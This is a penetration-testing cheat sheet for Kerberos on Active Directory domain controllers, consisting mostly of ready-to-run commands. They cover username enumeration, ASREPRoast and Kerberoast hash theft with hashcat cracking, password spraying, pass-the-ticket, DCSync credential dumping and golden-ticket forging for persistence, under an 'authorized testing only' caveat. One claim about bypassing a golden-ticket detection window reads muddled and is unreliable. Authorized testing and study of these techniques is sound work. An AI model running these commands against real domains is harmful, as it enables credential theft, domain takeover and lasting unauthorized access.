---
service: kerberos
title: Kerberos
ports: 88
aliases: kerberos5, krb5
---

# Kerberos — quick wins

**When you see it:** 88/tcp open on a DC — `kerbrute userenum` returns valid usernames
without credentials, or a domain user exists and SPNs are set → Kerberoast hashes
available for offline cracking with no additional privileges.

> Authorized testing only. Triage is read-only; steps marked ✏️ write to the target or
> cause authentication noise.

## Triage (read-only)
```sh
nmap -Pn -p88 --script krb5-enum-users \
    --script-args krb5-enum-users.realm=DOMAIN,userdb=users.txt H
nxc smb DC -u '' -p '' --rid-brute 5000   # harvest usernames via SMB first
kerbrute userenum --dc DC -d DOMAIN users.txt
```

## Quick wins

### User enumeration via AS-REQ
```sh
kerbrute userenum --dc DC -d DOMAIN /usr/share/seclists/Usernames/jsmith.txt \
    -o valid_users.txt
```
*Why:* Kerberos returns distinct error codes for `PRINCIPAL_UNKNOWN` vs
`PREAUTH_REQUIRED` — kerbrute exploits this to confirm valid usernames without triggering
normal account lockout (pre-auth failures don't count against the lockout counter on most
DCs).

### ASREPRoast — no password required
```sh
# With a user list (no creds needed)
GetNPUsers.py DOMAIN/ -usersfile valid_users.txt -no-pass -format hashcat \
    -outputfile asrep.txt -dc-ip DC

# Crack offline
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```
*Why:* Accounts with `DONT_REQUIRE_PREAUTH` set respond with an AS-REP ticket encrypted
with their password hash — crackable offline. Requires only a valid username list, not
credentials.

### Kerberoast — any domain user
```sh
# Dump all SPN hashes
GetUserSPNs.py DOMAIN/U:P -dc-ip DC -request -outputfile kerberoast.txt

# Crack offline
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```
*Why:* Any authenticated domain user can request a TGS ticket for any SPN. The ticket is
encrypted with the service account's password hash and can be cracked offline — service
accounts often have weak passwords and elevated privileges.

### Password spray via Kerberos (lockout-aware) ✏️
```sh
kerbrute passwordspray --dc DC -d DOMAIN valid_users.txt 'Password1!'
# OR via nxc (checks pass-pol first):
nxc smb DC -u valid_users.txt -p 'Password1!' --no-bruteforce --continue-on-success
```
*Why:* Kerberos spray is quieter than NTLM spray (no Event ID 4625 on failed AS-REQ);
nxc provides the password policy before spraying. **Always check lockout threshold and
observation window first.** Single-password spray only unless scope explicitly allows
more.

### Targeted SPN request (single service account)
```sh
GetUserSPNs.py DOMAIN/U:P -dc-ip DC -request-user SVCACCOUNT -outputfile svc.txt
```
*Why:* Targeted Kerberoast is more selective and generates less event log noise than
dumping all SPNs at once.

### Pass-the-Ticket (post-cred) ✏️
```sh
# Export a ccache from a captured TGT
export KRB5CCNAME=./ticket.ccache
impacket-secretsdump -k -no-pass DOMAIN/DC\$@DC -just-dc  # DCSync with DC TGT
psexec.py -k -no-pass DOMAIN/Administrator@HOST
```
*Why:* A captured TGT (from unconstrained delegation, memory dump, or golden/silver
ticket) can be injected into the Kerberos context for lateral movement without the
cleartext password.

### Golden ticket recap (post-DA) ✏️
```sh
# Requires: krbtgt NTLM hash (from DCSync), domain SID
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... \
    -domain DOMAIN Administrator
export KRB5CCNAME=./Administrator.ccache
psexec.py -k -no-pass DOMAIN/Administrator@HOST
```
*Why:* With the krbtgt hash, forge a TGT for any user with any group membership — valid
for 10 years by default (20 minutes golden-ticket detection window is bypassed by
setting ticket lifetime to ≤10h). This is a persistence/post-DA technique.

## aranum helpers
- `aranumtoolkit/network/enum-kerberos.sh` — runs kerbrute, nmap krb5-enum-users, bulk
  GetUserSPNs.py, and AS-REP cross-link from smb/ldap `_users.lst`.
- `standalones/creds/spray-scheduler.py` — rate-limited spray with lockout awareness.
- `standalones/creds/hash-format.py` — normalize Kerberoast / AS-REP hashes to hashcat
  mode format.

## Gotchas
- kerbrute user enum does NOT cause lockouts on standard DCs (AS-REQ without pre-auth is
  not a failed auth), but some hardened environments log and alert on them — verify before
  running large wordlists.
- Kerberoast is fully domain-user-gated — you need at least one cracked or granted
  account. Pair with SMB null-session RID-brute or ASREPRoast to get that first user.
- RC4 (type 23) TGS hashes crack faster than AES256 (type 18); nxc/impacket default to
  RC4 if the DC allows it. `--etype rc4` forces it explicitly.
- Clock skew > 5 minutes causes `KRB_AP_ERR_SKEW` — sync with `ntpdate DC` before
  any Kerberos operation.
- Golden/silver tickets are post-DA operations — scope them separately from the initial
  enumeration sign-off.

## Sources
- HackTricks `pentesting-kerberos-88`; Hackviser Kerberos pentesting;
  The Hacker Recipes Kerberoast / ASREProast; TarlogicSecurity Kerberos cheatsheet;
  impacket GetUserSPNs / GetNPUsers examples.
